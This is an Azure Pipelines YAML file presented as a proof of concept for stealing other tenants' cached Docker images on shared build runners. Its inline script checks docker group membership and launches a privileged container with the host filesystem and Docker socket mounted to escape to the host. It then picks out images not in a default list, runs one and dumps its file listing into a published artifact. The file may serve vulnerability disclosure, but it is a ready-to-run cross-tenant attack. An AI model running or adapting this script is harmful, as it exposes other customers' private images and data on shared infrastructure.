# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Cross-Tenant Docker Cache Exfiltration'
  jobs:
  - job: Pillage_Docker_Cache
    displayName: 'PoC: Steal Cached Images from Other Tenants'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Exfiltrate Foreign Docker Image Contents'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."

          echo "--- ESCAPING CONTAINER to analyze the host's Docker cache ---"
          
          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
            -v /var/run/docker.sock:/var/run/docker.sock \
            -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              # We need the docker client inside our helper container
              apk add --no-cache docker-cli

              echo '--- [HOST] Listing all Docker images cached on the host machine ---'
              docker images --format '{{.Repository}}:{{.Tag}}' > /artifacts/host-docker-images.txt

              # This is a list of known, pre-warmed images on the runner.
              # We will filter these out to find images left by other jobs.
              cat << EOF > /tmp/default_images.txt
              node:20
              node:20-alpine
              moby/buildkit:latest
              node:22
              node:22-alpine
              ubuntu:22.04
              debian:11
              alpine:3.19
              ubuntu:20.04
              node:18-alpine
              node:18
              alpine:3.18
              alpine:3.17
              debian:10
              alpine:3.16
              alpine:latest
              EOF

              echo '--- [HOST] Searching for foreign images left by other tenants... ---'
              # Use grep to find images that are NOT in our default list.
              grep -vf /tmp/default_images.txt /artifacts/host-docker-images.txt > /artifacts/foreign-images.txt || true

              if [ ! -s "/artifacts/foreign-images.txt" ]; then
                echo '⚠️ No foreign images found in this run. The host may have been clean.'
                echo 'Check host-docker-images.txt for the full list.'
                exit 0
              fi

              VICTIM_IMAGE=\$(head -n 1 /artifacts/foreign-images.txt)
              echo \"✅✅✅ SUCCESS: Found a foreign image: \$VICTIM_IMAGE\"
              
              echo '--- [HOST] Attempting to run the victim image and dump its filesystem ---'
              # This is the final proof: we run their image and list all its files.
              docker run --rm --entrypoint='' \"\$VICTIM_IMAGE\" sh -c 'ls -R /' > /artifacts/victim-image-filesystem.txt 2>&1 || \
                echo 'Failed to run victim image; it may not have a shell.' > /artifacts/victim-image-filesystem.txt
            "
          
          echo "--- SCRIPT COMPLETE ---"
          if [ -s "artifacts/foreign-images.txt" ]; then
            VICTIM_IMAGE=$(head -n 1 artifacts/foreign-images.txt)
            echo "✅✅✅ SMOKING GUN FOUND: Discovered foreign image '\$VICTIM_IMAGE' and dumped its contents."
            echo "--- First 50 lines of exfiltrated filesystem from '\$VICTIM_IMAGE' ---"
            cat artifacts/victim-image-filesystem.txt | head -n 50
          else
            echo "⚠️ No conclusive evidence found on this run. The host may have been clean."
          fi

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Docker Exfiltration Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-proof-docker-cache'
